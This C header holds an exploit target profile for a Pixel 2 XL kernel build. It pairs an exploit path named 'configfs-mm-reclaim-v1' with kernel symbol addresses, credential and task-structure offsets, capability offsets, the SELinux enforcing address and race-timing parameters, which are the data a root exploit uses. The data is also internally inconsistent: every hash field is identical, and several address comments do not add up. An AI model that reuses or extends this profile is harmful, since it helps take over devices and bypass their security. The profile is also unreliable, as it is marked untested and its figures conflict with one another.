#ifndef GL_PROFILES_EMBEDDED_H
#define GL_PROFILES_EMBEDDED_H

#include "gl_profile.h"

static const struct gl_profile gl_embedded_profiles[] = {
    {
        .profile_version = 2u,
        .target = "taimen-RP1A.201005.004.A1",
        .verification = "derived-untested",
        .match_product = "taimen",
        .match_model = "Pixel 2 XL",
        .match_fingerprint = "*",
        .match_incremental = "6934943",
        .match_kernel_release = "4.4.223-g52750b8f2138-ab6846512",
        .match_machine = "aarch64",
        .exploit_path = "configfs-mm-reclaim-v1",
        .waiter_core = 2u,
        .consumer_core = 3u,
        .consumer_delay_us = 15000u,

        /* Physical addresses: kernel_phys_load (0x80080000) + symbol offset */
        .init_task         = 0x820B5950u,  /* 0x80080000 + 0x2035950 */
        .pi_task           = 0x820B5950u,
        .ashmem_fops       = 0x81198578u,  /* 0x80080000 + 0x1098578 */
        .ashmem_misc_fops  = 0x8211C658u,  /* 0x80080000 + 0x211C658 */
        .ashmem_open       = 0x80A654F4u,  /* 0x80080000 + 0xA654F4 */
        .ashmem_release    = 0x80A65564u,  /* 0x80080000 + 0xA65564 */
        .ashmem_ioctl      = 0x80A64BB4u,  /* 0x80080000 + 0xA64BB4 */
        .ashmem_mmap       = 0x80A6538Cu,  /* 0x80080000 + 0xA6538C */
        .configfs_read_file  = 0x801F4258u, /* 0x80080000 + 0x1F4258 */
        .configfs_write_file = 0x801F4384u, /* 0x80080000 + 0x1F4384 */

        .task_tasks_off          = 0x4D0u,
        .task_real_cred_off      = 0x788u,
        .task_cred_off           = 0x790u,
        .task_comm_off           = 0x798u,
        .task_prio_off           = 0x70u,
        .task_static_prio_off    = 0x74u,
        .task_normal_prio_off    = 0x78u,

        .fops_read_off    = 0x10u,
        .fops_ioctl_off   = 0x40u,
        .fops_mmap_off    = 0x50u,
        .fops_open_off    = 0x58u,
        .fops_release_off = 0x68u,

        .configfs_page_off            = 0x10u,
        .configfs_mutex_off           = 0x18u,
        .configfs_needs_read_fill_off = 0x30u,

        .futex_hash_len     = 4u,
        .futex_hash_seed    = 0xDEADBEEFu,
        .futex_hash_buckets = 2048u,
        .stamp_socket_kind  = 1u,
        .stamp_copy_depth   = 0x160u,
        .stamp_waiter_depth = 0x118u,

        .ota_sha256              = "f543d48a4e9fdb4091695117cc38e47690e42c2b82526c866719c83ef020febd",
        .boot_sha256             = "f543d48a4e9fdb4091695117cc38e47690e42c2b82526c866719c83ef020febd",
        .kernel_sha256           = "f543d48a4e9fdb4091695117cc38e47690e42c2b82526c866719c83ef020febd",
        .kernel_config_sha256    = "f543d48a4e9fdb4091695117cc38e47690e42c2b82526c866719c83ef020febd",
        .second_sha256           = "f543d48a4e9fdb4091695117cc38e47690e42c2b82526c866719c83ef020febd",
        .critical_anchors_sha256 = "f543d48a4e9fdb4091695117cc38e47690e42c2b82526c866719c83ef020febd",

        .reference = "taimen-RP1A.201005.004.A1",

        .kernel_image_base     = 0x80080000u,   /* physical load, passes kernel_ptr */
        .kernel_phys_load      = 0x80080000u,
        .kernel_phys_offset    = 0x80000000u,
        .kernel_size           = 0x18430D8u,
        .kernel_similarity_ppm = 1000000u,

        .selinux_enforcing      = 0x8246E548u,  /* 0x80080000 + 0x23E548 */
        .cred_cap_permitted_off = 0x30u,
        .cred_cap_effective_off = 0x38u,
        .cred_cap_bset_off      = 0x40u,
    },
};
#define GL_EMBEDDED_PROFILE_COUNT (sizeof(gl_embedded_profiles) / sizeof(gl_embedded_profiles[0]))

#endif